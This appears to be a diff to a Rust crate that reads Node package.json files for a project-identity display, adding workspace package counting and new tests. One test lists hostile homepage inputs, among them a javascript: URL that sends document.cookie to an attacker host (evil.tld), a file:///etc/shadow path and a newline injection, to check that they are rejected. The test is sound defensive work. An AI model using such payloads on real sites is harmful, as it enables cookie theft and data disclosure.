@@ -6,7 +6,7 @@
 //!
 //! Parse and read errors fall back to defaults; non-NotFound read errors and
 //! parse errors are reported via `tracing` (`debug!` / `warn!`) so a malformed
-//! manifest does not silently look like a missing one (TASK-0394).
+//! manifest does not silently look like a missing one.
 
 #![cfg_attr(
     test,
@@ -18,6 +18,10 @@
     )
 )]
 
+// The four modules below are private, so every `pub` item inside them is
+// crate-internal already — that spelling, rather than `pub(crate)`, is what
+// `clippy::redundant_pub_crate` enforces workspace-wide. The crate's exported
+// surface is `AboutNodeExtension` alone.
 mod package_json;
 mod package_manager;
 mod repo_url;
@@ -35,6 +39,9 @@ const DESCRIPTION: &str = "Node project identity";
 const SHORTNAME: &str = "about-node";
 const DATA_PROVIDER_NAME: &str = "project_identity";
 
+/// Datasource extension supplying the Node stack's about providers
+/// (identity and units, read from `package.json`) to the generic
+/// `ops_about` renderers.
 #[non_exhaustive]
 pub struct AboutNodeExtension;
 
@@ -85,6 +92,14 @@ impl DataProvider for NodeIdentityProvider {
             let pkg_manager = detect_package_manager(root, has_packagemanager.as_deref());
             let stack_detail = build_stack_detail(engines_node.as_deref(), pkg_manager);
 
+            // The packages row carries the count of the same resolved
+            // workspace members the units provider lists (npm/yarn
+            // `workspaces` or `pnpm-workspace.yaml`), read through the shared
+            // manifest cache. A single-package project — no workspaces
+            // declaration — keeps `None`, so the row stays hidden.
+            let members = units::resolved_members(root);
+            let module_count = (!members.is_empty()).then_some(members.len());
+
             ParsedManifest::build(|m| {
                 m.name = name;
                 m.version = version;
@@ -96,7 +111,7 @@ impl DataProvider for NodeIdentityProvider {
                 m.stack_label = "Node";
                 m.stack_detail = stack_detail;
                 m.module_label = "packages";
-                m.module_count = None;
+                m.module_count = module_count;
             })
         })
     }
@@ -118,8 +133,8 @@ mod tests {
     use super::*;
     use ops_core::project_identity::ProjectIdentity;
 
-    // DUP-1 / TASK-1736: the fixture-writing helper lives once in
-    // `ops_about::test_support`; alias it so call sites keep the short name.
+    // The fixture-writing helper lives once in `ops_about::test_support`;
+    // alias it so call sites keep the short name.
     use ops_about::test_support::write_file as write;
 
     #[test]
@@ -162,6 +177,70 @@ mod tests {
         assert!(fields.iter().any(|f| f.id == "homepage"));
     }
 
+    /// A hostile `homepage` must reach `ProjectIdentity.homepage` as `None`.
+    /// Drives the full provider path
+    /// (parse → `ParsedManifest` → deserialised identity) so the gate is
+    /// pinned at the surface `crates/core/src/project_identity/card.rs`
+    /// renders, not only inside the parser.
+    #[test]
+    fn provider_drops_hostile_homepage_from_identity() {
+        for homepage in [
+            // XSS sink.
+            "javascript:fetch('https://evil.tld/?c='+document.cookie)",
+            // Local resource disclosure.
+            "file:///etc/shadow",
+            // Forged extra line in the card / log records. Spelled with a
+            // JSON `\n` escape so the file parses and the *deserialised*
+            // value (a real LF) is what reaches the gate — a raw newline
+            // inside a JSON string is invalid JSON and would never get that
+            // far.
+            "https://demo.dev\\nINJECT",
+        ] {
+            let dir = tempfile::tempdir().unwrap();
+            write(
+                &dir.path().join("package.json"),
+                &format!("{{\"name\":\"x\",\"homepage\":\"{homepage}\"}}"),
+            );
+            let provider = NodeIdentityProvider;
+            let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
+            let id: ProjectIdentity =
+                serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+            assert!(
+                id.homepage.is_none(),
+                "hostile homepage {homepage:?} must reach identity as None"
+            );
+            // The rest of the identity still flows: dropping one field is
+            // degradation, not failure.
+            assert_eq!(id.name, "x");
+        }
+    }
+
+    /// A malformed `package.json` is parsed by both registered providers —
+    /// and a third time for the identity card's package count — but must
+    /// produce a single warn record naming the file, so an operator is not
+    /// sent hunting for a second broken manifest that does not exist.
+    #[test]
+    fn malformed_package_json_warns_once_across_both_providers() {
+        let dir = tempfile::tempdir().unwrap();
+        write(&dir.path().join("package.json"), "{ \"name\": ");
+
+        let (logs, ()) = ops_about::test_support::capture_tracing(tracing::Level::WARN, || {
+            let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
+            let _ = NodeIdentityProvider.provide(&mut ctx).unwrap();
+            let _ = units::NodeUnitsProvider.provide(&mut ctx).unwrap();
+        });
+
+        assert_eq!(
+            logs.matches("failed to parse package.json").count(),
+            1,
+            "expected exactly one parse-failure warn: {logs}"
+        );
+        assert!(
+            logs.contains("recovery=\"defaults\""),
+            "the warn must carry the recovery field: {logs}"
+        );
+    }
+
     #[test]
     fn parse_minimal_package_json() {
         let dir = tempfile::tempdir().unwrap();
@@ -187,12 +266,65 @@ mod tests {
         assert_eq!(id.license.as_deref(), Some("MIT"));
         assert_eq!(id.stack_label, "Node");
         assert_eq!(id.module_label, "packages");
+        // A single-package project (no workspaces declaration) keeps
+        // `module_count = None` — the row stays hidden.
+        assert_eq!(id.module_count, None);
         assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
         assert_eq!(
             id.repository.as_deref(),
             Some("https://github.com/user/repo")
         );
         assert_eq!(id.authors, vec!["Alice <a@example.com>"]);
+    }
+
+    /// The identity card's `module_count` must equal the units provider's
+    /// list length on the same fixture, for both workspace sources — npm/yarn
+    /// `workspaces` and `pnpm-workspace.yaml`.
+    #[test]
+    fn workspace_module_count_equals_the_units_provider_length() {
+        for (label, root_pkg, pnpm_yaml) in [
+            (
+                "npm workspaces",
+                r#"{ "name": "root", "workspaces": ["packages/*"] }"#,
+                None,
+            ),
+            (
+                "pnpm-workspace.yaml",
+                r#"{ "name": "root" }"#,
+                Some("packages:\n  - 'packages/*'\n"),
+            ),
+        ] {
+            let dir = tempfile::tempdir().unwrap();
+            write(&dir.path().join("package.json"), root_pkg);
+            if let Some(yaml) = pnpm_yaml {
+                write(&dir.path().join("pnpm-workspace.yaml"), yaml);
+            }
+            write(
+                &dir.path().join("packages/alpha/package.json"),
+                r#"{ "name": "alpha", "version": "1.0.0" }"#,
+            );
+            write(
+                &dir.path().join("packages/beta/package.json"),
+                r#"{ "name": "beta", "version": "2.0.0" }"#,
+            );
+            // A directory under the glob with no package.json resolves to no
+            // unit — and must not be counted.
+            std::fs::create_dir_all(dir.path().join("packages/not-a-pkg")).unwrap();
+
+            let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
+            let identity: ProjectIdentity =
+                serde_json::from_value(NodeIdentityProvider.provide(&mut ctx).unwrap()).unwrap();
+            let units: Vec<ops_core::project_identity::ProjectUnit> =
+                serde_json::from_value(units::NodeUnitsProvider.provide(&mut ctx).unwrap())
+                    .unwrap();
+
+            assert_eq!(units.len(), 2, "{label}: two members resolve, one does not");
+            assert_eq!(
+                identity.module_count,
+                Some(units.len()),
+                "{label}: the packages row must equal the units list length"
+            );
+        }
     }
 
     #[test]
@@ -322,5 +454,74 @@ mod tests {
         let id: ProjectIdentity =
             serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
         assert_eq!(id.license.as_deref(), Some("Apache-2.0"));
+    }
+
+    /// The `register_data_providers` closure is the crate's only wiring to
+    /// the rest of `ops`, and both `registry.register` results are discarded
+    /// with `let _ =` — under the registry's first-write-wins policy a name
+    /// collision inside the closure would silently drop a provider. That
+    /// discarded `Option` is not observable from outside the closure, so the
+    /// closest pin is asserted instead: *both* keys must land, and each must
+    /// answer with its own payload shape over a real fixture.
+    #[test]
+    fn extension_registers_both_providers_and_each_answers() {
+        use ops_extension::{DataRegistry, Extension};
+
+        let mut registry = DataRegistry::new();
+        AboutNodeExtension.register_data_providers(&mut registry);
+        assert_eq!(
+            registry.provider_names(),
+            vec!["project_identity", "project_units"],
+            "both providers must land under distinct keys — a key collision \
+             inside the closure would reject one with no failure anywhere"
+        );
+
+        let dir = tempfile::tempdir().unwrap();
+        write(
+            &dir.path().join("package.json"),
+            r#"{ "name": "root", "workspaces": ["packages/*"] }"#,
+        );
+        write(
+            &dir.path().join("packages/alpha/package.json"),
+            r#"{ "name": "alpha", "version": "1.0.0" }"#,
+        );
+        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
+
+        let identity = registry
+            .provide("project_identity", &mut ctx)
+            .expect("identity provider must answer");
+        assert_eq!(identity["stack_label"], serde_json::json!("Node"));
+
+        let units = registry
+            .provide("project_units", &mut ctx)
+            .expect("units provider must answer");
+        assert_eq!(
+            units
+                .as_array()
+                .and_then(|a| a.first())
+                .and_then(|u| u.get("name")),
+            Some(&serde_json::json!("alpha")),
+            "units payload must list the workspace member: {units}"
+        );
+    }
+
+    /// `NODE_ABOUT_FACTORY` is the linkme entry the
+    /// CLI discovers the extension through; assert it yields the extension
+    /// with the declared metadata (name, shortname, stack, type). A stack
+    /// mismatch here ships the Node providers under the wrong stack tag while
+    /// every provider-level test stays green.
+    #[test]
+    fn factory_yields_the_node_about_extension_with_declared_metadata() {
+        use ops_extension::Extension;
+
+        let cfg = ops_core::config::Config::empty();
+        let (name, ext) = (super::NODE_ABOUT_FACTORY)(&cfg, std::path::Path::new("."))
+            .expect("factory must yield the extension");
+        assert_eq!(name, NAME);
+        assert_eq!(Extension::name(ext.as_ref()), "about-node");
+        assert_eq!(ext.shortname(), SHORTNAME);
+        assert_eq!(ext.stack(), Some(ops_extension::Stack::Node));
+        assert!(ext.types().is_datasource());
+        assert_eq!(ext.data_provider_name(), Some(DATA_PROVIDER_NAME));
     }
 }
